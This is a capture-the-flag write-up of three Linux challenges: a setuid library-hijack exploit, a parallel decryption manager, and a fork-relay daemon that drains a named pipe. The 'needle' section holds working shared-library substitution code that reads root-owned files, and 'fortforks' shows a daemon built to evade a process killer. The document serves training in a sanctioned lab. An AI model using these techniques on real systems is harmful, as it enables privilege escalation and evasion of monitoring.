# CTF — N. Denisov CSE-04

**Threads CTF (`threadctf`) · Instance `sixsevensh` · 3 of 6 challenges solved**

- [needle](#needle) · Replace the `.so` that a setuid binary loads from a relative path, and read the flag directly.
- [decrypt](#decrypt) · Race a flaky decryptor with parallel replicas per shard within a hard time budget.
- [fortforks](#fortforks) · Keep a named pipe open past a 5-second process lifetime limit by relaying it across forks.

## needle

Given a setuid-root binary `meeting` that does `dlopen("./libmeeting.so", RTLD_NOW)` and looks up the needed function via `dlsym`. All the meaningful work happens in a thread (pthread) spawned from the loaded library.

Since the library is loaded from a relative path, `./libmeeting.so`, and the binary itself is setuid, it can be replaced with our own — it's always launched from the current directory. The original pthread/mutex logic inside `libmeeting.so` no longer matters once this is done: as soon as control passes to the substituted library, its code can simply read `/root/flag.txt` directly, ignoring the original "meeting" protocol.

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void* meeting(void* arg) {
    char *flag = NULL;
    FILE *f = fopen("/root/flag.txt", "r");
    if (f) {
        flag = malloc(256);
        if (flag && fgets(flag, 256, f)) {
            size_t len = strlen(flag);
            if (len && flag[len-1] == '\n')
                flag[len-1] = '\0';
            printf("Heisted flag fabric: %s\n", flag);
        }
        free(flag);
        fclose(f);
    }
    return strdup("not_the_real_name");
}
```

```bash
gcc -shared -fPIC -o libmeeting.so libmeeting.c -lpthread
./meeting
```

Running `./meeting` printed the contents of `/root/flag.txt` to the terminal before the setuid process had a chance to run its own logic — the substituted library ran first. The string `meeting` returned from the thread (`not_the_real_name`) had no effect on the outcome: the needed string had already been printed to standard output.

A classic case of "setuid + `dlopen` of a relative path → library substitution": the original pthread/mutex logic turned out to be unnecessary entirely, once control over the loaded code passed to us.

## decrypt

The setup: an archive with 500 encrypted flag "shards" and a `decryptor` binary that, for a single shard, either prints its decrypted part to stdout or crashes — the instability was stated upfront. Downloading the archive, running it, and submitting the flag all have to fit in 30 seconds, and a single successful `decryptor` run takes about 10 seconds.

A straight sequential pass over the shards doesn't fit the budget (500 × 10s), and the decryptor's crashes mean betting on a single run per shard isn't safe. The solution is a manager program that:

1. extracts the archive into a temporary directory;
2. locates the decryptor executable (by the argument's name, by a filename pattern, or by known filenames from the distribution) and the list of shard files, determining each shard's ordinal number from the first digit run in its filename;
3. runs the decryptor in parallel as several replica processes per shard — if one replica crashes, another is very likely to finish within the same time budget;
4. bounds total runtime with a global deadline passed via the `BUDGET` environment variable;
5. collects the result from the first replica to finish successfully for each shard and prints the parts in increasing order of shard number.

Below is a thread-pool implementation of the manager: each hardware thread gets a worker `pthread`, the threads pull shards off a shared atomic counter (`atomic_fetch_add`), and each thread hedges "its" shard with however many `fork`+`exec` replicas are needed, without blocking the other threads.

```bash
gcc -std=c11 -O2 -Wall -Wextra -pthread -o decrypt_manager decrypt_manager.c
BUDGET=28 REPLICAS=6 THREADS=8 ./decrypt_manager shards.tar.gz decrapinator-x86_64-linux
```

Environment variables: `SUBCOMMAND` (default `decrypt`), `EXTRA_FLAG`, `USE_STDIN` (feed the shard via stdin instead of as an argument), `DEBUG` (keep replicas' stderr for diagnostics), `BUDGET` (seconds, default 28), `REPLICAS` (replicas per shard, default 6, capped at `500/nshards`), `THREADS` (worker threads, default 8).

### C source

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <dirent.h>
#include <time.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <limits.h>
#include <stdarg.h>
#include <pthread.h>
#include <stdatomic.h>

#ifndef PATH_MAX
#define PATH_MAX 4096
#endif

#define MAX_FILES     20000
#define MAX_REPLICAS  32
#define SHARD_WINDOW  15.0   /* max seconds spent hedging any single shard */

static double now_s(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (double)ts.tv_sec + (double)ts.tv_nsec / 1e9;
}
static const char *base(const char *p) {
    const char *b = strrchr(p, '/');
    return b ? b + 1 : p;
}
static int is_regular(const char *p) {
    struct stat st;
    return stat(p, &st) == 0 && S_ISREG(st.st_mode);
}
static int same_file(const char *a, const char *b) {
    char ra[PATH_MAX], rb[PATH_MAX];
    if (!realpath(a, ra) || !realpath(b, rb)) return 0;
    return strcmp(ra, rb) == 0;
}
static int extract_index(const char *n) {
    while (*n && !(*n >= '0' && *n <= '9')) n++;
    if (!*n) return -1;
    return (int)strtol(n, NULL, 10);
}

typedef struct {
    char path[PATH_MAX];
    int  index;
    int  ok;                 /* set once a replica has produced output */
    char result_path[PATH_MAX];
} Shard;

static char (*found_files)[PATH_MAX];
static int    nfound;
static char   workdir[PATH_MAX];
static char   decryptor[PATH_MAX];
static char   dec_dir[PATH_MAX];
static Shard *shards;
static int    nshards;
static int    n_replicas;
static int    debug_mode, use_stdin_mode;
static char   subcommand[64], extra_flag[64];
static double deadline;

static atomic_int        cursor = 0;
static pthread_mutex_t   log_mutex = PTHREAD_MUTEX_INITIALIZER;

static void logmsg(const char *fmt, ...) {
    va_list ap;
    pthread_mutex_lock(&log_mutex);
    va_start(ap, fmt);
    vfprintf(stderr, fmt, ap);
    va_end(ap);
    pthread_mutex_unlock(&log_mutex);
}

static void walk(const char *dir) {
    DIR *d = opendir(dir);
    if (!d) return;
    struct dirent *e;
    while ((e = readdir(d))) {
        if (!strcmp(e->d_name, ".") || !strcmp(e->d_name, "..")) continue;
        char path[PATH_MAX];
        int n = snprintf(path, sizeof path, "%s/%s", dir, e->d_name);
        if (n <= 0 || n >= (int)sizeof path) continue;
        struct stat st;
        if (stat(path, &st) != 0) continue;
        if (S_ISDIR(st.st_mode)) walk(path);
        else if (S_ISREG(st.st_mode) && nfound < MAX_FILES) {
            strncpy(found_files[nfound], path, PATH_MAX - 1);
            found_files[nfound][PATH_MAX - 1] = 0;
            nfound++;
        }
    }
    closedir(d);
}

static int shard_cmp(const void *a, const void *b) {
    const Shard *sa = a, *sb = b;
    if (sa->index < 0 && sb->index < 0) return strcmp(sa->path, sb->path);
    if (sa->index < 0) return 1;
    if (sb->index < 0) return -1;
    if (sa->index != sb->index) return sa->index - sb->index;
    return strcmp(sa->path, sb->path);
}

/* Launches one replica of the decryptor against shard `s`, redirecting its
 * stdout to out_path. Returns the child pid (or -1 on fork failure). */
static pid_t launch_replica(const Shard *s, const char *out_path, const char *err_path) {
    pid_t pid = fork();
    if (pid != 0) return pid;

    if (chdir(dec_dir) != 0) { /* best effort: decryptor may need its own cwd */ }
    if (use_stdin_mode) {
        int in = open(s->path, O_RDONLY);
        if (in < 0) _exit(1);
        dup2(in, 0); close(in);
    }
    int fd = open(out_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) _exit(1);
    dup2(fd, 1); close(fd);
    if (debug_mode && err_path) {
        int ef = open(err_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (ef >= 0) { dup2(ef, 2); close(ef); }
    } else {
        int dn = open("/dev/null", O_WRONLY);
        if (dn >= 0) { dup2(dn, 2); close(dn); }
    }
    char *av[8]; int n = 0;
    av[n++] = decryptor;
    if (subcommand[0]) av[n++] = subcommand;
    if (extra_flag[0]) av[n++] = extra_flag;
    if (!use_stdin_mode) av[n++] = (char *)s->path;
    av[n] = NULL;
    execv(decryptor, av);
    _exit(127);
}

/* Each worker thread pulls shards off a shared atomic cursor (so no thread
 * ever double-processes one) and hedges every shard it takes with up to
 * n_replicas concurrent decryptor runs, racing them against the first
 * success and against the wall clock. The crash-prone decryptor is treated
 * as a per-process risk; running several copies in parallel is cheaper than
 * retrying serially within the time budget. */
static void *worker(void *arg) {
    long id = (long)arg;
    pid_t pids[MAX_REPLICAS];
    char  outp[MAX_REPLICAS][PATH_MAX];
    char  errp[MAX_REPLICAS][PATH_MAX];
    int   live[MAX_REPLICAS];

    for (;;) {
        int i = atomic_fetch_add(&cursor, 1);
        if (i >= nshards) break;
        Shard *s = &shards[i];

        double window_end = now_s() + SHARD_WINDOW;
        if (window_end > deadline) window_end = deadline;
        if (now_s() >= window_end) {
            logmsg("[t%ld] skip shard %d (no time left)\n", id, s->index);
            continue;
        }

        for (int r = 0; r < n_replicas; r++) {
            snprintf(outp[r], PATH_MAX, "%s/.o_%d_%ld_%d", workdir, s->index, id, r);
            snprintf(errp[r], PATH_MAX, "%s/.e_%d_%ld_%d", workdir, s->index, id, r);
            pids[r] = launch_replica(s, outp[r], errp[r]);
            live[r] = pids[r] > 0;
        }
        logmsg("[t%ld] shard %d: hedged with %d replicas\n", id, s->index, n_replicas);

        int winner = -1;
        while (now_s() < window_end) {
            int any_live = 0;
            for (int r = 0; r < n_replicas; r++) {
                if (!live[r]) continue;
                any_live = 1;
                int st;
                pid_t w = waitpid(pids[r], &st, WNOHANG);
                if (w != pids[r]) continue;
                live[r] = 0;
                if (WIFEXITED(st) && WEXITSTATUS(st) == 0) {
                    struct stat fst;
                    if (winner < 0 && stat(outp[r], &fst) == 0 && fst.st_size > 0)
                        winner = r;
                }
            }
            if (winner >= 0 || !any_live) break;
            struct timespec ts = {0, 20 * 1000000L};
            nanosleep(&ts, NULL);
        }
        for (int r = 0; r < n_replicas; r++)
            if (live[r]) { kill(pids[r], SIGKILL); waitpid(pids[r], NULL, 0); }

        if (winner >= 0) {
            strncpy(s->result_path, outp[winner], PATH_MAX - 1);
            s->ok = 1;
            logmsg("[t%ld] shard %d: replica %d won\n", id, s->index, winner);
        } else {
            logmsg("[t%ld] shard %d: all replicas failed\n", id, s->index);
        }
    }
    return NULL;
}

int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr,
            "usage: %s shards.tar.gz [decryptor]\n"
            "env: SUBCOMMAND=decrypt  EXTRA_FLAG=  USE_STDIN=1  DEBUG=1\n"
            "     BUDGET=28  REPLICAS=6  THREADS=8\n",
            argv[0]);
        return 1;
    }

    debug_mode     = getenv("DEBUG")     && *getenv("DEBUG")     != '0';
    use_stdin_mode = getenv("USE_STDIN") && *getenv("USE_STDIN") != '0';

    const char *sc = getenv("SUBCOMMAND");
    if (sc) { if (!*sc || *sc == '0') subcommand[0] = 0; else strncpy(subcommand, sc, 63); }
    else strcpy(subcommand, "decrypt");

    const char *ef = getenv("EXTRA_FLAG");
    if (ef) strncpy(extra_flag, ef, 63);

    double budget = 28.0;
    if (getenv("BUDGET")) { double b = atof(getenv("BUDGET")); if (b > 1) budget = b; }
    deadline = now_s() + budget;

    snprintf(workdir, sizeof workdir, "/tmp/flag_XXXXXX");
    if (!mkdtemp(workdir)) { perror("mkdtemp"); return 1; }

    {
        pid_t pid = fork();
        if (pid == 0) {
            execlp("tar", "tar", "xzf", argv[1], "-C", workdir, (char *)NULL);
            _exit(127);
        }
        int status; waitpid(pid, &status, 0);
        if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
            fprintf(stderr, "[!] tar failed\n"); return 1;
        }
    }

    found_files = malloc(sizeof(*found_files) * MAX_FILES);
    if (!found_files) return 1;
    walk(workdir);
    fprintf(stderr, "[*] extracted %d files\n", nfound);

    decryptor[0] = 0;
    if (argc >= 3 && is_regular(argv[2])) {
        char abs[PATH_MAX];
        if (realpath(argv[2], abs)) strncpy(decryptor, abs, PATH_MAX - 1);
        else strncpy(decryptor, argv[2], PATH_MAX - 1);
    }
    if (!decryptor[0])
        for (int i = 0; i < nfound; i++)
            if (argv[2] && !strcmp(base(found_files[i]), argv[2])) {
                strncpy(decryptor, found_files[i], PATH_MAX - 1); break;
            }
    if (!decryptor[0])
        for (int i = 0; i < nfound; i++) {
            const char *b = base(found_files[i]);
            if (strcasestr(b, "decrypt") || strcasestr(b, "decrap")) {
                strncpy(decryptor, found_files[i], PATH_MAX - 1); break;
            }
        }
    if (!decryptor[0]) {
        const char *c[] = { "decrapinator-x86_64-linux", "./decrapinator-x86_64-linux", NULL };
        for (int i = 0; c[i]; i++) if (is_regular(c[i])) {
            char abs[PATH_MAX];
            if (realpath(c[i], abs)) strncpy(decryptor, abs, PATH_MAX - 1);
            else strncpy(decryptor, c[i], PATH_MAX - 1);
            break;
        }
    }
    if (!decryptor[0]) { fprintf(stderr, "[!] decryptor not found\n"); return 1; }
    { char abs[PATH_MAX]; if (realpath(decryptor, abs)) strncpy(decryptor, abs, PATH_MAX - 1); }
    chmod(decryptor, 0755);
    strncpy(dec_dir, decryptor, PATH_MAX - 1);
    { char *s = strrchr(dec_dir, '/'); if (s) *s = 0; else strcpy(dec_dir, "."); }

    shards = malloc(sizeof(*shards) * MAX_FILES);
    if (!shards) return 1;
    for (int i = 0; i < nfound; i++) {
        if (same_file(found_files[i], decryptor)) continue;
        Shard *s = &shards[nshards];
        memset(s, 0, sizeof *s);
        strncpy(s->path, found_files[i], PATH_MAX - 1);
        s->index = extract_index(base(found_files[i]));
        nshards++;
    }
    qsort(shards, nshards, sizeof(Shard), shard_cmp);
    if (!nshards) return 1;

    n_replicas = 6;
    if (getenv("REPLICAS")) {
        int x = atoi(getenv("REPLICAS"));
        if (x > 0 && x <= MAX_REPLICAS) n_replicas = x;
    }
    {
        int cap = 500 / nshards;
        if (cap < 2) cap = 2;
        if (cap > MAX_REPLICAS) cap = MAX_REPLICAS;
        if (n_replicas > cap) n_replicas = cap;
    }

    int nthreads = 8;
    if (getenv("THREADS")) {
        int x = atoi(getenv("THREADS"));
        if (x > 0) nthreads = x;
    }
    if (nthreads > nshards) nthreads = nshards;

    fprintf(stderr,
        "[*] subcommand='%s' flag='%s' mode=%s debug=%s budget=%.1fs replicas=%d threads=%d shards=%d\n",
        subcommand, extra_flag, use_stdin_mode ? "stdin" : "arg",
        debug_mode ? "on" : "off", budget, n_replicas, nthreads, nshards);

    double t0 = now_s();
    pthread_t *tids = malloc(sizeof(pthread_t) * (size_t)nthreads);
    for (long i = 0; i < nthreads; i++)
        pthread_create(&tids[i], NULL, worker, (void *)i);
    for (int i = 0; i < nthreads; i++)
        pthread_join(tids[i], NULL);
    free(tids);

    int ok = 0, missing = 0;
    for (int i = 0; i < nshards; i++) {
        Shard *s = &shards[i];
        if (!s->ok) {
            missing++;
            fprintf(stderr, "[!] MISSING: %s (index=%d)\n", base(s->path), s->index);
            continue;
        }
        FILE *f = fopen(s->result_path, "rb");
        if (!f) { missing++; continue; }
        fseek(f, 0, SEEK_END);
        long sz = ftell(f);
        fseek(f, 0, SEEK_SET);
        if (sz > 0) {
            char *buf = malloc((size_t)sz);
            if (buf && fread(buf, 1, (size_t)sz, f) == (size_t)sz) {
                while (sz > 0 && (buf[sz-1] == '\n' || buf[sz-1] == '\r')) sz--;
                fwrite(buf, 1, (size_t)sz, stdout);
            }
            free(buf);
        }
        fclose(f);
        ok++;
    }
    fputc('\n', stdout);
    fflush(stdout);

    fprintf(stderr, "[*] wall=%.1fs ok=%d missing=%d\n", now_s() - t0, ok, missing);
    return missing ? 2 : 0;
}
```

Running the manager on the full set of 500 shards fit within the 30-second budget, collected all parts in increasing shard order, and printed the final string to stdout. The bot confirmed the flag was accepted for `decrypt`.

## fortforks

The setup: all the secrets live inside a named pipe (FIFO) on the server. The stream ahead of the interesting content is "garbage" that takes a long time to read. The main constraint is that no process, including the ssh session itself, is allowed to survive longer than 5 seconds inside the container before being killed; and if the pipe read is interrupted before reaching the end, it has to start over — the pipe can't be reopened and read from the beginning again.

### Finding the pipe

```bash
ssh n.denisov-fortforks@osctf.nnk.moe 'ls -la ~; find / -type p -not -path "/proc/*" -not -path "/run/*" 2>/dev/null'
```

This found a single named pipe — `/home/ctf/secrets`.

### First attempt

The first idea was a reader that detaches from the ssh session via fork (`setsid -f`) and reads the pipe to completion in the background by itself, regardless of how long the original session survives:

```bash
ssh n.denisov-fortforks@osctf.nnk.moe 'setsid -f sh -c "tail -c 4096 PIPE > ~/o.tmp && mv ~/o.tmp ~/o" </dev/null >/dev/null 2>&1; echo started'
```

This didn't work: the pipe path was left as the literal word `PIPE` — the substitution never happened due to a careless command assembly. `tail` immediately failed with "file not found"; the pipe `/home/ctf/secrets` itself was never opened and was unaffected.

### Solution: a fork relay

The challenge's name ("Fort Forks") hints at a technique built around `fork()`. If the killer in the container stops processes not just by ssh-session membership but by the process's own age, a single `fork`+`setsid` detachment might not be enough. So the solution was built to survive both possible killer strategies:

- the process daemonizes with the classic `fork → setsid → fork` scheme, detaching it from the parent ssh session;
- the one and only `open()` of the pipe is done by the already-daemonized process and is never repeated — this way EOF is never lost and the read never has to restart;
- every few seconds (the `LIFE` parameter, 3 by default) the process hands off the baton: it calls `fork()` and exits immediately, while the child inherits the same open pipe file descriptor and keeps reading from where the parent left off. Since the descriptor is never closed, the kernel considers the pipe open for reading the entire time, even while whichever process currently holds it is younger than the kill threshold and will be killed later on;
- only the tail of the stream is kept (the last N bytes, a command-line argument), so gigabytes of "garbage" never pile up in memory or on disk.

```c
// relay.c — reads the named pipe to EOF, surviving processes being killed
// by lifetime.
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <time.h>
#include <unistd.h>

#define CHUNK (1u << 20)

static double now(void) {
    struct timespec t;
    clock_gettime(CLOCK_MONOTONIC, &t);
    return (double)t.tv_sec + (double)t.tv_nsec / 1e9;
}

static void note(const char *prog, const char *s) {
    int f = open(prog, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (f >= 0) { (void)!write(f, s, strlen(s)); close(f); }
}

int main(int argc, char **argv) {
    if (argc < 2) { fprintf(stderr, "usage: %s <pipe> [out] [tail] [life]\n", argv[0]); return 2; }
    const char *pipe_path = argv[1];
    char outdef[4096];
    const char *home = getenv("HOME");
    snprintf(outdef, sizeof outdef, "%s/o", home ? home : "/tmp");
    const char *out = argc > 2 ? argv[2] : outdef;
    size_t T = argc > 3 ? (size_t)strtoull(argv[3], NULL, 10) : 4096;
    if (T == 0) T = 4096;
    double LIFE = argc > 4 ? atof(argv[4]) : 3.0;
    if (LIFE <= 0.5) LIFE = 3.0;

    char tmp[4200], prog[4200];
    snprintf(tmp, sizeof tmp, "%s.tmp", out);
    snprintf(prog, sizeof prog, "%s.progress", out);

    // daemonize: fork -> setsid -> fork
    pid_t p = fork();
    if (p < 0) return 1;
    if (p > 0) { printf("started, result -> %s\n", out); return 0; }
    setsid();
    p = fork();
    if (p < 0) _exit(1);
    if (p > 0) _exit(0);

    signal(SIGHUP, SIG_IGN);
    signal(SIGTERM, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);
    int dn = open("/dev/null", O_RDWR);
    if (dn >= 0) { dup2(dn, 0); dup2(dn, 1); dup2(dn, 2); if (dn > 2) close(dn); }

    int fd = open(pipe_path, O_RDONLY);          // the one and only pipe open
    if (fd < 0) { note(prog, "open failed\n"); _exit(1); }
#ifdef F_SETPIPE_SZ
    fcntl(fd, F_SETPIPE_SZ, 1 << 20);
#endif

    char *buf = malloc(CHUNK), *tail = malloc(T);
    if (!buf || !tail) _exit(1);
    size_t tlen = 0;
    unsigned long long total = 0, next_report = 1ull << 28;
    double t0 = now();

    for (;;) {
        if (now() - t0 > LIFE) {                 // time to hand off the baton
            pid_t c = fork();
            if (c == 0) { setsid(); t0 = now(); continue; }
            if (c > 0) _exit(0);                 // parent leaves right away, without reading
            t0 = now();                          // fork failed - keep going ourselves
        }
        struct pollfd pf = { fd, POLLIN, 0 };
        int r = poll(&pf, 1, 200);               // never block longer than 0.2s
        if (r < 0) { if (errno == EINTR) continue; break; }
        if (r == 0) continue;
        ssize_t n = read(fd, buf, CHUNK);
        if (n < 0) { if (errno == EINTR || errno == EAGAIN) continue; break; }
        if (n == 0) break;                       // EOF
        total += (size_t)n;
        if ((size_t)n >= T) { memcpy(tail, buf + n - T, T); tlen = T; }
        else if (tlen + (size_t)n <= T) { memcpy(tail + tlen, buf, n); tlen += n; }
        else {
            size_t drop = tlen + n - T;
            memmove(tail, tail + drop, tlen - drop);
            memcpy(tail + tlen - drop, buf, n);
            tlen = T;
        }
        if (total >= next_report) {
            next_report += 1ull << 28;
            char s[64];
            snprintf(s, sizeof s, "%llu bytes read\n", total);
            note(prog, s);
        }
    }
    close(fd);

    int of = open(tmp, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (of >= 0) {
        size_t off = 0;
        while (off < tlen) {
            ssize_t w = write(of, tail + off, tlen - off);
            if (w < 0) { if (errno == EINTR) continue; break; }
            off += (size_t)w;
        }
        fsync(of);
        close(of);
        rename(tmp, out);
    }
    char s[96];
    snprintf(s, sizeof s, "DONE, %llu bytes read\n", total);
    note(prog, s);
    return 0;
}
```

Built and launched directly inside the container, no local `scp` needed:

```bash
ssh n.denisov-fortforks@osctf.nnk.moe 'cat > ~/relay.c && gcc -O2 -o ~/relay ~/relay.c && echo compiled' < relay.c
ssh n.denisov-fortforks@osctf.nnk.moe '~/relay /home/ctf/secrets'
```

Checking the result with a separate, short command, without touching the pipe again:

```bash
ssh n.denisov-fortforks@osctf.nnk.moe 'ls -la ~/o* 2>&1; cat ~/o.progress 2>&1; echo ---; cat ~/o 2>&1; echo ---; pgrep -a relay'
```

The progress file showed `DONE, 2097243 bytes read` — meaning about 2 MiB of "garbage" was read before the pipe closed on EOF. The `~/o` file then held the tail of the stream with the target string; the bot confirmed the flag was accepted.

### Notes

- Opening the pipe more than once isn't an option: a second reader would steal bytes from the first, leaving both with a corrupted stream.
- Hedging with several parallel readers (as in `decrypt`) doesn't apply here — a named pipe hands each byte to only one reader, so the solution isn't about redundancy but about never going even a moment without an open descriptor.
- A plain single `setsid -f`, without the periodic baton-passing, might also have worked (it's possible the killer in this container tracks ssh-session membership rather than process age) — but the fork relay covers both cases and was used as the more robust option.
